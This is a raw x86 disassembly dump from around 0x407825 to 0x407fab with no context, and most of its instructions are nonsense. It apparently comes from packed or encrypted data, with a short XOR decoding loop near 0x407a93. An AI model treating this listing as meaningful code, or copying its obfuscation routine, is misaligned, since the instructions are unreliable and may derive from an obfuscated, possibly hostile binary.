  407825:	stos   BYTE PTR es:[edi],al
  407826:	in     eax,dx
  407827:	and    ecx,0xffffffb6
  40782a:	idiv   BYTE PTR [edx+ebp*1-0x469e1e24]
  407831:	sub    al,0x2d
  407833:	pop    edx
  407834:	push   cs
  407835:	mov    ebp,0xe8e9c8ed
  40783a:	pop    es
  40783b:	and    bh,BYTE PTR [edx+ebp*1+0x3b]
  40783f:	push   esp
  407840:	push   es
  407841:	rcr    ebx,1
  407843:	push   edi
  407844:	and    bh,BYTE PTR [edi+0x6fe3b39e]
  40784a:	out    dx,al
  40784b:	call   0x38d2:0x94b6b656
  407852:	cmp    al,0xa7
  407854:	mov    WORD PTR [ebp+0x70c9f76b],cs
  40785a:	call   0x901cb55c
  40785f:	inc    ebp
  407860:	mov    dl,0xfb
  407862:	pop    ss
  407863:	mov    eax,0xace293ef
  407868:	add    DWORD PTR [ebx],ebp
  40786a:	pop    edi
  40786b:	retf   0x5b05
  40786e:	and    BYTE PTR [eax+0x56],dl
  407871:	jecxz  0x4077f5
  407873:	loopne 0x407803
  407875:	xor    BYTE PTR [ecx-0x1c],cl
  407878:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407879:	adc    DWORD PTR [edx+ecx*1-0x1b26dd88],esp
  407880:	icebp  
  407881:	lods   eax,DWORD PTR ds:[esi]
  407882:	pop    es
  407883:	pop    esi
  407884:	pop    esi
  407885:	or     eax,0xae88219a
  40788a:	shl    DWORD PTR [ecx-0x36],cl
  40788d:	dec    edx
  40788e:	or     eax,esi
  407890:	aaa    
  407891:	mov    ds:0x6fc756a1,eax
  407896:	in     al,dx
  407897:	mov    ecx,0x508495f2
  40789c:	cmp    eax,0x43b12e79
  4078a1:	xor    ah,bh
  4078a3:	jo     0x4078bb
  4078a5:	cwde   
  4078a6:	lea    edx,[eax]
  4078a8:	push   0x4f248462
  4078ad:	les    esi,FWORD PTR [ecx]
  4078af:	jne    0x40784c
  4078b1:	xchg   ebx,eax
  4078b2:	mov    ds:0xb5a4ee05,eax
  4078b7:	stos   DWORD PTR es:[edi],eax
  4078b8:	call   DWORD PTR [esi-0x3d]
  4078bb:	push   esp
  4078bc:	mov    bh,0xa7
  4078be:	mov    edi,0x8c03ced6
  4078c3:	repnz mov bh,0x96
  4078c6:	sub    DWORD PTR [eax],0x26b821c4
  4078cc:	cmp    BYTE PTR [eax],dl
  4078ce:	retf   0x9594
  4078d1:	add    ebp,edx
  4078d3:	fimul  DWORD PTR [eax+0x26f850c1]
  4078d9:	ficomp WORD PTR [eax+0x6f]
  4078dc:	into   
  4078dd:	push   ebp
  4078de:	in     al,dx
  4078df:	leave  
  4078e0:	mov    ebx,0x4cdb0d0c
  4078e5:	push   0x2
  4078e7:	xor    ch,cl
  4078e9:	out    0xb8,al
  4078eb:	(bad)  
  4078ec:	mov    eax,0xad442498
  4078f1:	cmp    eax,0x35d588c1
  4078f6:	int3   
  4078f7:	xchg   esi,eax
  4078f8:	shl    DWORD PTR [edi-0xc],0xc5
  4078fc:	sar    eax,0xf8
  4078ff:	ins    DWORD PTR es:[edi],dx
  407900:	pusha  
  407901:	push   es
  407902:	mov    dh,0x54
  407904:	ror    BYTE PTR [ecx+0x77],0x1d
  407908:	cli    
  407909:	pop    es
  40790a:	div    DWORD PTR [esi-0x7a]
  40790d:	push   edx
  40790e:	mov    ecx,0xa5aedba5
  407913:	fimul  DWORD PTR [eax]
  407915:	outs   dx,BYTE PTR ds:[esi]
  407916:	retf   0xef36
  407919:	and    eax,0x3bb2d1cc
  40791e:	outs   dx,DWORD PTR ds:[esi]
  40791f:	aaa    
  407920:	or     dh,0x6a
  407923:	(bad)  
  407924:	shl    BYTE PTR ds:0x1f4f4638,1
  40792a:	outs   dx,DWORD PTR ds:[esi]
  40792b:	nop
  40792c:	pop    eax
  40792e:	ja     0x407966
  407930:	outs   dx,BYTE PTR ds:[esi]
  407931:	int3   
  407932:	add    BYTE PTR [eax+ebx*8],ch
  407935:	clc    
  407936:	push   0x187e30ac
  40793b:	enter  0xe227,0xd0
  40793f:	adc    BYTE PTR es:[edi-0x39],0x15
  407944:	fisubr DWORD PTR [ecx+0x10]
  407947:	adc    BYTE PTR [ecx+0x1b],dh
  40794a:	xor    ecx,edi
  40794c:	test   BYTE PTR [esi],ah
  40794e:	fdivr  QWORD PTR [ebx+0x3]
  407951:	mov    WORD PTR ds:0x9e333a2c,ds
  407957:	mov    eax,ds:0x3282e491
  40795c:	push   0xc944808d
  407961:	push   0x7d
  407963:	xor    al,0x66
  407965:	adc    BYTE PTR [edx+esi*8-0x7f],dl
  407969:	daa    
  40796a:	(bad)  
  40796b:	sub    al,0x78
  40796d:	jmp    0xcee75af2
  407972:	imul   esi,DWORD PTR [ecx],0x1bc6e62b
  407978:	shr    BYTE PTR [ebp+0x4f],0x3f
  40797c:	fmul   QWORD PTR [eax]
  40797e:	mov    esi,0xdc98bd9f
  407983:	mov    cs,ebp
  407985:	mov    bl,0x66
  407987:	mov    WORD PTR [ebx+0x11d21d72],cs
  40798d:	daa    
  40798e:	xlat   BYTE PTR ds:[ebx]
  40798f:	cmp    eax,0xd5d59f59
  407994:	push   esp
  407995:	adc    DWORD PTR [ecx-0x63],ecx
  407998:	sub    dl,BYTE PTR [edi-0x1c]
  40799b:	call   0x2751:0x374c8a26
  4079a2:	cmp    ebp,DWORD PTR [edi-0x14]
  4079a5:	push   edx
  4079a6:	daa    
  4079a7:	in     al,0xc4
  4079a9:	add    BYTE PTR [ecx+esi*1+0x54e7274a],bh
  4079b0:	mov    cl,0xb5
  4079b2:	mov    ecx,DWORD PTR [edx-0x29553ac1]
  4079b8:	int    0x9c
  4079ba:	ins    DWORD PTR es:[edi],dx
  4079bb:	adc    eax,0xb974b210
  4079c0:	retf   
  4079c1:	cdq    
  4079c2:	xchg   esi,eax
  4079c3:	jne    0x407a2b
  4079c5:	push   0x420cadf9
  4079ca:	or     BYTE PTR [esi+eax*2+0x1faf710d],dl
  4079d1:	sar    DWORD PTR [ebp+0x8],0xee
  4079d5:	pop    eax
  4079d6:	cli    
  4079d7:	cmc    
  4079d8:	push   eax
  4079d9:	mov    cs,WORD PTR [ebx]
  4079db:	gs mov ah,0x89
  4079de:	loop   0x4079cf
  4079e0:	jl     0x407973
  4079e2:	(bad)
  4079e6:	sub    DWORD PTR [edi],ebp
  4079e8:	xchg   edi,eax
  4079e9:	mov    ecx,DWORD PTR [eax-0x4089cba]
  4079ef:	mov    bl,0x14
  4079f1:	adc    edi,DWORD PTR ds:0x43db08e4
  4079f7:	les    edi,FWORD PTR [ebp-0x7a4b90fb]
  4079fd:	stos   BYTE PTR es:[edi],al
  4079fe:	sbb    eax,0xd03afdba
  407a03:	inc    ecx
  407a04:	(bad)  
  407a05:	out    0x68,al
  407a07:	push   ebp
  407a08:	xor    al,0x2d
  407a0a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407a0b:	std    
  407a0c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407a0d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407a0e:	push   0x5a
  407a10:	push   edi
  407a11:	xchg   edx,eax
  407a12:	shl    dh,0xe8
  407a15:	call   0xec7d1d2f
  407a1a:	fdiv   st(2),st
  407a1c:	sar    BYTE PTR [edx],cl
  407a1e:	and    ecx,0x14
  407a21:	lds    edi,FWORD PTR [ecx-0x51e09310]
  407a27:	pop    edi
  407a28:	or     DWORD PTR [edx+edx*1+0x36],esi
  407a2c:	outs   dx,BYTE PTR ds:[esi]
  407a2d:	mov    ch,0xfe
  407a2f:	adc    ebx,ebp
  407a31:	aad    0x3
  407a33:	icebp  
  407a34:	jge    0x407a0d
  407a36:	and    al,0x69
  407a38:	neg    DWORD PTR [edx-0x4072a809]
  407a3e:	xor    BYTE PTR [edx],ch
  407a40:	call   FWORD PTR [esp+ecx*2-0x47]
  407a44:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407a45:	inc    ebp
  407a46:	not    eax
  407a48:	in     eax,0x9b
  407a4a:	mov    esi,0xd5644cbc
  407a4f:	lods   al,BYTE PTR ds:[esi]
  407a50:	push   cs
  407a51:	xchg   ecx,eax
  407a52:	outs   dx,DWORD PTR ds:[esi]
  407a53:	mov    WORD PTR [eax+0xf],gs
  407a56:	cmp    dh,BYTE PTR [edx+edi*2+0x4d]
  407a5a:	mov    cl,0x52
  407a5c:	jge    0x407a11
  407a5e:	lock pop ebx
  407a60:	out    0x29,al
  407a62:	add    al,0x6a
  407a64:	dec    ebp
  407a65:	int3   
  407a66:	mov    esp,DWORD PTR [ebx]
  407a68:	or     DWORD PTR [edx],ebp
  407a6a:	adc    DWORD PTR [edx-0x78],0x6a379f56
  407a71:	push   0x4e3f4975
  407a76:	and    al,0xc4
  407a78:	mov    bh,0x6f
  407a7a:	(bad)  
  407a7b:	or     BYTE PTR [ebx],dl
  407a7d:	ss leave 
  407a7f:	ins    BYTE PTR es:[edi],dx
  407a80:	pushf  
  407a81:	rcl    edx,cl
  407a83:	pop    ebp
  407a84:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407a85:	ins    BYTE PTR es:[edi],dx
  407a86:	popf   
  407a87:	inc    ebp
  407a88:	out    0x15,al
  407a8a:	popf   
  407a8b:	push   cs
  407a8c:	mov    ecx,0xfc70366
  407a91:	mov    bh,0xc0
  407a93:	mov    DWORD PTR [ebp-0x14],eax
  407a96:	mov    eax,DWORD PTR [ebp+0x8]
  407a99:	movzx  eax,WORD PTR [eax+edx*4]
  407a9d:	xor    eax,0x8a36
  407aa2:	add    eax,edi
  407aa4:	mov    edi,DWORD PTR [ebp-0x14]
  407aa7:	mov    BYTE PTR [ebp+edi*1-0x58],al
  407aab:	mov    eax,DWORD PTR [ebp-0xc]
  407aae:	inc    edx
  407aaf:	jmp    0x407db8
  407ab4:	ror    ebp,0xd6
  407ab7:	retf   
  407ab8:	fcmove st,st(3)
  407aba:	rcl    ebp,1
  407abc:	adc    edx,DWORD PTR [esi+0x3c]
  407abf:	xchg   esp,eax
  407ac0:	in     al,dx
  407ac1:	xchg   edx,eax
  407ac2:	lds    ebx,FWORD PTR [esi-0x64]
  407ac5:	fstp   TBYTE PTR [eax+0x78]
  407ac8:	fs jle 0x407b43
  407acb:	js     0x407adf
  407acd:	jb     0x407b4c
  407acf:	out    dx,al
  407ad0:	adc    DWORD PTR [edi+edx*1-0x4f],eax
  407ad4:	out    0x17,al
  407ad6:	adc    eax,0x592a3835
  407adb:	call   0x995e:0xc3ad7ef2
  407ae2:	test   BYTE PTR [esi+0x7b8aacc0],0x88
  407ae9:	in     eax,0x8a
  407aeb:	adc    ebp,DWORD PTR [edx+0xdbc713f]
  407af1:	out    dx,eax
  407af2:	fistp  WORD PTR [ecx+0x45]
  407af5:	lods   al,BYTE PTR ds:[esi]
  407af6:	in     al,0x2a
  407af8:	ret    0xe873
  407afb:	dec    ebx
  407afc:	xchg   ebx,eax
  407afd:	daa    
  407afe:	sbb    BYTE PTR [edi-0xa6d1a4f],ch
  407b04:	mov    DWORD PTR [eax+ecx*4+0x62],edi
  407b08:	mov    dl,0xeb
  407b0a:	mov    cl,0x21
  407b0c:	repz (bad) 
  407b0e:	out    dx,al
  407b0f:	sbb    al,0x34
  407b11:	lock cld 
  407b13:	loope  0x407b7d
  407b15:	(bad)  
  407b16:	lods   al,BYTE PTR ds:[esi]
  407b17:	jno    0x407b66
  407b19:	daa    
  407b1a:	mov    ds:0x57ebdf4b,al
  407b1f:	add    eax,0x67f154bc
  407b24:	loope  0x407b1a
  407b26:	lock (bad) 
  407b28:	xchg   DWORD PTR [ecx],ecx
  407b2a:	pop    ecx
  407b2b:	xchg   ecx,eax
  407b2c:	pop    ebp
  407b2d:	mov    BYTE PTR [edi],ch
  407b2f:	sub    al,0xe8
  407b31:	arpl   WORD PTR [edi],sp
  407b33:	outs   dx,DWORD PTR ds:[esi]
  407b34:	pop    es
  407b35:	mov    edi,0x5f1099db
  407b3a:	adc    al,0x1d
  407b3c:	jecxz  0x407b8a
  407b3e:	push   esi
  407b3f:	mov    BYTE PTR [ebp+0xb],ch
  407b42:	mov    cl,0xae
  407b44:	xchg   esi,eax
  407b45:	jmp    0xa882d994
  407b4a:	pop    edx
  407b4b:	les    ebp,FWORD PTR [ecx+0x1a61a989]
  407b51:	ins    BYTE PTR es:[edi],dx
  407b52:	addr16 lahf 
  407b54:	push   es
  407b55:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407b56:	and    al,0xef
  407b58:	xor    eax,0x9eaf8028
  407b5d:	aad    0x23
  407b5f:	adc    al,0xa
  407b61:	push   cs
  407b62:	lock add eax,DWORD PTR [esi]
  407b65:	ficom  WORD PTR [ebx-0x6c]
  407b68:	and    al,0x40
  407b6a:	mov    eax,0xcf843151
  407b6f:	scas   eax,DWORD PTR es:[edi]
  407b70:	repz ret 0xfdf8
  407b74:	in     al,0xe4
  407b76:	add    ecx,ecx
  407b78:	push   edi
  407b79:	aas    
  407b7a:	dec    BYTE PTR [edx+ebx*2]
  407b7d:	gs pop ss
  407b7f:	cmp    DWORD PTR [eax+ecx*8],ebp
  407b82:	retf   0x828a
  407b85:	test   DWORD PTR [ebx],edi
  407b87:	mov    edi,0xed652a0f
  407b8c:	popf   
  407b8d:	ins    DWORD PTR es:[edi],dx
  407b8e:	push   eax
  407b8f:	dec    ebp
  407b90:	inc    edi
  407b91:	cmp    al,0x46
  407b93:	sub    BYTE PTR [ecx-0x458fd317],dh
  407b99:	ret    
  407b9a:	push   esp
  407b9b:	sub    BYTE PTR [ebx],bl
  407b9d:	push   ss
  407b9e:	sbb    bh,BYTE PTR [edx-0x48f8ebeb]
  407ba4:	daa    
  407ba5:	inc    eax
  407ba6:	mov    eax,0x8341b653
  407bab:	inc    ecx
  407bac:	in     al,dx
  407bad:	aam    0x21
  407baf:	in     eax,dx
  407bb0:	sti    
  407bb1:	mov    dh,0x5
  407bb3:	repz sub eax,0x16b4b099
  407bb9:	enter  0xd557,0x8c
  407bbd:	fistp  QWORD PTR [ecx]
  407bbf:	cmp    al,0x73
  407bc1:	push   ebp
  407bc2:	mov    esp,DWORD PTR [ebp+0x5f9ad18d]
  407bc8:	inc    esi
  407bc9:	jbe    0x407bce
  407bcb:	out    0x6c,eax
  407bcd:	push   esi
  407bce:	stc    
  407bcf:	xchg   esp,eax
  407bd0:	pop    esp
  407bd1:	daa    
  407bd2:	in     al,0x92
  407bd4:	idiv   BYTE PTR [ebx-0x69]
  407bd7:	lods   al,BYTE PTR ds:[esi]
  407bd8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407bd9:	xchg   ebx,edi
  407bdb:	sar    edx,cl
  407bdd:	inc    edx
  407bde:	xchg   edx,eax
  407bdf:	nop
  407be0:	sub    eax,0x6b12cca5
  407be5:	std    
  407be6:	jg     0x407bad
  407be8:	xchg   DWORD PTR [ebx],eax
  407bea:	push   edi
  407beb:	push   cs
  407bec:	sbb    bh,BYTE PTR [ebx+0x14a1275d]
  407bf2:	mov    BYTE PTR [ecx+edx*2],bh
  407bf5:	pop    eax
  407bf6:	ret    0xaa1
  407bf9:	pop    ds
  407bfa:	dec    edx
  407bfb:	data16 sahf 
  407bfd:	cmc    
  407bfe:	mov    bl,0xc0
  407c00:	pop    ds
  407c01:	mov    cl,0x86
  407c03:	pushf  
  407c04:	fldcw  WORD PTR [ebx+0x54e20964]
  407c0a:	pop    esi
  407c0b:	pop    esi
  407c0c:	repz (bad) 
  407c0e:	cmc    
  407c0f:	and    ah,BYTE PTR [esi+ebx*4-0x4ef7c38a]
  407c16:	dec    esp
  407c17:	sub    al,0xbc
  407c19:	pop    ebx
  407c1a:	rcr    BYTE PTR [edi-0x27],cl
  407c1d:	stos   BYTE PTR es:[edi],al
  407c1e:	add    dl,dl
  407c20:	inc    esp
  407c21:	sub    eax,0x87de2b59
  407c26:	int3   
  407c27:	addr16 fs cmp al,0x84
  407c2b:	xor    ch,dh
  407c2d:	leave  
  407c2e:	mov    eax,ds:0xf090205d
  407c33:	popf   
  407c34:	sub    eax,0x97f85a24
  407c39:	jae    0x407c60
  407c3b:	add    eax,0xa0b2e73b
  407c40:	sbb    DWORD PTR [eax+0x64],0x18
  407c44:	fsubr  st(1),st
  407c46:	add    eax,0x3df99d62
  407c4b:	dec    esp
  407c4c:	push   0x527ec769
  407c51:	mov    eax,0xc197ac5c
  407c56:	iret   
  407c57:	ds xchg edx,eax
  407c59:	retf   
  407c5a:	mov    edx,0x3872555d
  407c5f:	xor    edx,DWORD PTR [edi]
  407c61:	das    
  407c62:	mov    WORD PTR [eax+0x17369bc7],?
  407c68:	arpl   WORD PTR [edi],ax
  407c6a:	in     al,0x6b
  407c6c:	std    
  407c6d:	mov    bl,0x2c
  407c6f:	ror    DWORD PTR [eax+0x1a71287d],0xfa
  407c76:	jne    0x407cb0
  407c78:	inc    esi
  407c79:	imul   esi,DWORD PTR [eax+0x11c0c5ba],0x59808b1b
  407c83:	dec    esi
  407c84:	mov    dh,0xc0
  407c86:	clc    
  407c87:	ret    
  407c88:	push   edi
  407c89:	retf   
  407c8a:	xlat   BYTE PTR ds:[ebx]
  407c8b:	dec    esi
  407c8c:	push   ebp
  407c8d:	dec    esp
  407c8e:	xchg   ebx,eax
  407c8f:	int3   
  407c90:	shl    bh,cl
  407c92:	(bad)  
  407c93:	cmp    al,0x47
  407c95:	mov    edx,0x81d12a5f
  407c9a:	xchg   ebp,eax
  407c9b:	(bad)  
  407c9d:	xchg   ebx,eax
  407c9e:	mov    dl,BYTE PTR [eax]
  407ca0:	cli    
  407ca1:	pop    ebx
  407ca2:	ret    
  407ca3:	pop    edi
  407ca4:	popf   
  407ca5:	push   edx
  407ca6:	iret   
  407ca7:	test   BYTE PTR [edi+esi*8+0x63],bl
  407cab:	in     eax,dx
  407cac:	je     0x407cd3
  407cae:	sbb    al,0x62
  407cb0:	(bad)  
  407cb1:	iret   
  407cb2:	or     cl,BYTE PTR [ebp-0x56]
  407cb5:	sbb    eax,0x5345a82e
  407cba:	jecxz  0x407cc1
  407cbc:	jge    0x407cf1
  407cbe:	jae    0x407c53
  407cc0:	outs   dx,DWORD PTR ds:[esi]
  407cc1:	(bad)  
  407cc2:	sbb    cl,BYTE PTR [eax+0x12a1e0a2]
  407cc8:	mov    al,0x62
  407cca:	adc    DWORD PTR [esp+edx*4-0x6],edi
  407cce:	inc    ecx
  407ccf:	int3   
  407cd0:	inc    ecx
  407cd1:	jle    0x407d33
  407cd3:	adc    bl,BYTE PTR ds:0x984d6325
  407cd9:	lahf   
  407cda:	sub    cl,BYTE PTR [esi+0x2]
  407cdd:	cwde   
  407cde:	aad    0x27
  407ce0:	pop    ebp
  407ce1:	shl    DWORD PTR [edx-0x40],0x7d
  407ce5:	jp     0x407ca2
  407ce7:	sbb    dx,WORD PTR [ebx]
  407cea:	cwde   
  407ceb:	fist   WORD PTR [edx-0x5be66a2d]
  407cf1:	jg     0x407cad
  407cf3:	push   edi
  407cf4:	add    BYTE PTR [esi+0x5d],0xf4
  407cf8:	pop    ds
  407cf9:	(bad)  
  407cfa:	mov    esp,0x9ce200ca
  407cff:	fmul   st(1),st
  407d01:	les    eax,FWORD PTR [ecx]
  407d03:	cmp    eax,0x9db49ddc
  407d08:	retf   0xf255
  407d0b:	(bad)  
  407d0c:	(bad)  
  407d0d:	dec    edi
  407d0e:	repz ss push 0xffffffed
  407d12:	pop    ss
  407d13:	xchg   edx,eax
  407d14:	adc    bl,BYTE PTR [ebp+0x6aeb1ae2]
  407d1a:	sub    eax,0xa4d4554e
  407d1f:	in     eax,0x7c
  407d21:	mov    eax,0x85f9db60
  407d26:	test   BYTE PTR [ebp+0x50],ch
  407d29:	aam    0x85
  407d2b:	jne    0x407d64
  407d2d:	shr    ebp,0xff
  407d30:	aam    0x75
  407d32:	xchg   BYTE PTR [esi+edi*4+0x24],ch
  407d36:	push   edx
  407d37:	push   0x349ac029
  407d3c:	adc    ch,ch
  407d3e:	pop    eax
  407d3f:	addr16 inc ebx
  407d41:	push   es
  407d42:	in     al,0xa3
  407d44:	sub    DWORD PTR [edx-0x35],esi
  407d47:	fnstenv ds:0xbbde4ced
  407d4d:	jge    0x407daa
  407d4f:	das    
  407d50:	xchg   edi,eax
  407d51:	mov    esi,esp
  407d53:	mov    eax,0xedc63089
  407d58:	sbb    dh,dh
  407d5a:	push   edi
  407d5b:	adc    esp,ecx
  407d5d:	pop    ds
  407d5e:	pop    ecx
  407d5f:	xchg   ecx,eax
  407d60:	mov    ?,WORD PTR [edi+0x54]
  407d63:	div    dl
  407d65:	loope  0x407d42
  407d67:	shl    DWORD PTR [eax+0x3a2f5bd2],0xb6
  407d6e:	iret   
  407d6f:	neg    ecx
  407d71:	jge    0x407d54
  407d73:	xor    al,0x46
  407d75:	cmp    DWORD PTR [esi],esp
  407d77:	das    
  407d78:	pop    es
  407d79:	jo     0x407d81
  407d7b:	pop    edi
  407d7c:	inc    edi
  407d7d:	push   cs
  407d7e:	out    0xc,al
  407d80:	scas   al,BYTE PTR es:[edi]
  407d81:	das    
  407d82:	test   DWORD PTR gs:[edx-0x54],edx
  407d86:	ins    DWORD PTR es:[edi],dx
  407d87:	cs push eax
  407d89:	icebp  
  407d8a:	xor    eax,0x9c3b5419
  407d8f:	ins    DWORD PTR es:[edi],dx
  407d90:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407d91:	jne    0x407da1
  407d93:	dec    edi
  407d94:	es jnp 0x407d7c
  407d97:	pop    ebx
  407d98:	inc    ebx
  407d99:	and    esp,DWORD PTR [esi+eax*8-0x7d]
  407d9d:	stos   DWORD PTR es:[edi],eax
  407d9e:	stos   DWORD PTR es:[edi],eax
  407d9f:	clc    
  407da0:	dec    edi
  407da1:	stos   DWORD PTR es:[edi],eax
  407da2:	push   eax
  407da3:	mov    al,ds:0x232bebc1
  407da8:	pop    ecx
  407da9:	int3   
  407daa:	int3   
  407dab:	pop    esi
  407dac:	lods   eax,DWORD PTR ds:[esi]
  407dad:	mov    bl,0xce
  407daf:	call   0x4803:0xf6ee8b1
  407db6:	sti    
  407db7:	ss cmp edx,eax
  407dba:	jne    0x407772
  407dc0:	pop    edi
  407dc1:	pop    ebx
  407dc2:	mov    eax,DWORD PTR [ebp-0x8]
  407dc5:	mov    edx,DWORD PTR [ebp+0x10]
  407dc8:	jmp    0x4080d1
  407dcd:	retf   0xd73f
  407dd0:	ret    0xdad9
  407dd3:	fld    st(7)
  407dd5:	add    BYTE PTR [eax+0x7c],bl
  407dd8:	fdivr  DWORD PTR [ecx-0x778dc304]
  407dde:	fdivr  DWORD PTR [eax+0x78]
  407de1:	fs jle 0x407e5c
  407de4:	js     0x407d94
  407de6:	imul   BYTE PTR [eax-0x26]
  407de9:	and    bl,bl
  407deb:	pushf  
  407dec:	add    BYTE PTR [ebx*4+0x10feee57],cl
  407df3:	fist   DWORD PTR [eax+edx*2-0x7a]
  407df7:	adc    eax,0x23a747e8
  407dfc:	sar    esp,0xab
  407dff:	push   0x25a342be
  407e04:	pop    edx
  407e05:	jmp    0x1af1:0xebb9a764
  407e0c:	jb     0x407e5c
  407e0e:	sub    eax,0x2fe55ce0
  407e13:	(bad)  [ebx+0x24]
  407e16:	jmp    0x1778:0x40f4b3b3
  407e1d:	fisttp DWORD PTR [edi]
  407e1f:	jnp    0x407e15
  407e21:	xor    esi,DWORD PTR [esi]
  407e23:	call   0x3cba:0x93ce3d08
  407e2a:	cmp    dh,dh
  407e2c:	xchg   esi,eax
  407e2d:	mov    ebx,edi
  407e2f:	push   cs
  407e30:	icebp  
  407e31:	xor    esp,DWORD PTR [ebx]
  407e33:	hlt    
  407e34:	mov    bh,0xc8
  407e36:	mov    dl,0xd1
  407e38:	jns    0x407e75
  407e3a:	dec    esi
  407e3b:	add    DWORD PTR [ecx-0x372b6dd4],0xffffffd3
  407e42:	sahf   
  407e43:	rol    BYTE PTR [esi+0x2f033c5b],0xa4
  407e4a:	xor    eax,esi
  407e4c:	push   ebp
  407e4d:	ss push edx
  407e4f:	aad    0x9e
  407e51:	or     edx,edx
  407e53:	inc    esi
  407e54:	in     eax,dx
  407e55:	repnz or al,0x35
  407e58:	mov    edi,0xcc7618bc
  407e5d:	jg     0x407e2c
  407e5f:	mov    ds:0xbe011bc0,eax
  407e64:	and    al,0x81
  407e66:	cli    
  407e67:	popa   
  407e68:	icebp  
  407e69:	mov    edi,ebp
  407e6b:	or     eax,DWORD PTR [eax]
  407e6d:	stc    
  407e6e:	jb     0x407e27
  407e70:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407e71:	mov    eax,ds:0x164d4b2d
  407e76:	test   BYTE PTR ds:0x24cec7e1,dl
  407e7c:	stos   BYTE PTR es:[edi],al
  407e7d:	pop    ebx
  407e7e:	packuswb mm7,QWORD PTR [ebx+0x4b674b24]
  407e85:	shr    edx,0x4c
  407e88:	and    eax,0x540ea29b
  407e8d:	ficom  DWORD PTR [esi+ecx*2-0x73]
  407e91:	leave  
  407e92:	xchg   ebx,eax
  407e93:	out    0xd1,eax
  407e95:	sti    
  407e96:	or     DWORD PTR [eax+0xe35e126],esi
  407e9c:	cmp    al,0x14
  407e9e:	adc    ebp,DWORD PTR [edx+ebp*8+0x49b57037]
  407ea5:	dec    esi
  407ea6:	xchg   ecx,eax
  407ea7:	in     eax,dx
  407ea8:	stos   DWORD PTR es:[edi],eax
  407ea9:	out    dx,al
  407eaa:	dec    eax
  407eab:	jnp    0x407e88
  407ead:	mov    bh,0x72
  407eaf:	or     eax,0xf1009c46
  407eb4:	xor    al,BYTE PTR [ebx]
  407eb6:	scas   eax,DWORD PTR es:[edi]
  407eb7:	and    eax,0x9cfed1f4
  407ebc:	or     cl,bh
  407ebe:	push   ds
  407ebf:	daa    
  407ec0:	pop    ds
  407ec1:	das    
  407ec2:	inc    edx
  407ec3:	mov    eax,ds:0x147454d7
  407ec8:	sbb    BYTE PTR [eax],ch
  407eca:	neg    BYTE PTR [ecx+0x17]
  407ecd:	popa   
  407ece:	mov    ah,0x63
  407ed0:	mov    DWORD PTR [edi],ebx
  407ed2:	pusha  
  407ed3:	(bad)  [edx+0x51e72db1]
  407ed9:	popf   
  407eda:	mov    ch,0x5
  407edc:	(bad)  
  407ede:	mov    dl,0x34
  407ee0:	scas   al,BYTE PTR es:[edi]
  407ee1:	mov    al,0x7d
  407ee3:	dec    ebp
  407ee4:	and    al,0xd2
  407ee6:	ret    0x2020
  407ee9:	test   al,0xf2
  407eeb:	hlt    
  407eec:	cs sahf 
  407eee:	lods   eax,DWORD PTR ds:[esi]
  407eef:	lods   al,BYTE PTR ds:[esi]
  407ef0:	out    0xc4,eax
  407ef2:	leave  
  407ef3:	ins    BYTE PTR es:[edi],dx
  407ef4:	in     eax,dx
  407ef5:	xchg   BYTE PTR [ebp+0x23],ah
  407ef8:	leave  
  407ef9:	dec    edx
  407efa:	into   
  407efb:	mov    ss:0x75a0837f,eax
  407f01:	xchg   edx,eax
  407f02:	jg     0x407ed5
  407f04:	xchg   DWORD PTR [eax-0xec91b15],esp
  407f0a:	daa    
  407f0b:	mov    bl,0xbd
  407f0d:	inc    ebp
  407f0e:	inc    edi
  407f0f:	lfs    eax,FWORD PTR [esi]
  407f12:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407f13:	and    ah,BYTE PTR [ecx]
  407f15:	lahf   
  407f16:	ins    BYTE PTR es:[edi],dx
  407f17:	lods   eax,DWORD PTR ds:[esi]
  407f18:	mov    bh,0x47
  407f1a:	sbb    DWORD PTR [esp+edx*2-0x63e700ef],esi
  407f21:	adc    eax,0xd8b43f35
  407f26:	sub    al,0x4b
  407f28:	ret    
  407f29:	dec    edx
  407f2a:	cmc    
  407f2b:	(bad)  
  407f2d:	iret   
  407f2e:	and    DWORD PTR [edi+0x28],ebp
  407f31:	pop    edx
  407f32:	ss pop esi
  407f34:	mov    ch,0xb6
  407f36:	inc    ebx
  407f37:	push   edx
  407f38:	push   es
  407f39:	pop    es
  407f3a:	popf   
  407f3b:	and    al,BYTE PTR [edx+0x25d26e81]
  407f41:	sti    
  407f42:	xchg   esp,eax
  407f43:	shl    BYTE PTR [esi],1
  407f45:	jmp    0xcfc0:0xd84d2bd5
  407f4c:	das    
  407f4d:	adc    BYTE PTR [edx+eax*2+0x27],cl
  407f51:	xchg   DWORD PTR [edx+0xa],ebx
  407f54:	ss dec edi
  407f56:	add    al,BYTE PTR ds:0x668cdd1b
  407f5c:	lahf   
  407f5d:	lods   al,BYTE PTR ds:[esi]
  407f5e:	imul   edi,DWORD PTR [eax+eax*2],0x37
  407f62:	iret   
  407f63:	cmp    DWORD PTR ds:0x53cc38f3,eax
  407f69:	jl     0x407f47
  407f6b:	xor    dh,BYTE PTR [ebp+0x483b2a67]
  407f71:	sub    bh,dl
  407f73:	and    al,0x4a
  407f75:	jl     0x407ff6
  407f77:	fadd   QWORD PTR [edx-0x49f8943]
  407f7d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407f7e:	jo     0x407fe7
  407f80:	test   eax,0x79a6027f
  407f85:	aas    
  407f86:	mov    al,ds:0xed2d139d
  407f8b:	adc    eax,0x3bd128f4
  407f90:	cmp    al,0xce
  407f92:	mov    dl,0xd
  407f94:	xchg   ecx,eax
  407f95:	cs jmp 0xf9d2:0x5b6bfda5
  407f9d:	cdq    
  407f9e:	xchg   ecx,eax
  407f9f:	in     al,0xd0
  407fa1:	sti    
  407fa2:	push   esp
  407fa3:	jmp    0x407f58
  407fa5:	out    dx,al
  407fa6:	cmp    cl,BYTE PTR [esi+edx*8-0x65]
  407faa:	push   ds
  407fab:	mov    ebp,0xcc9aa889
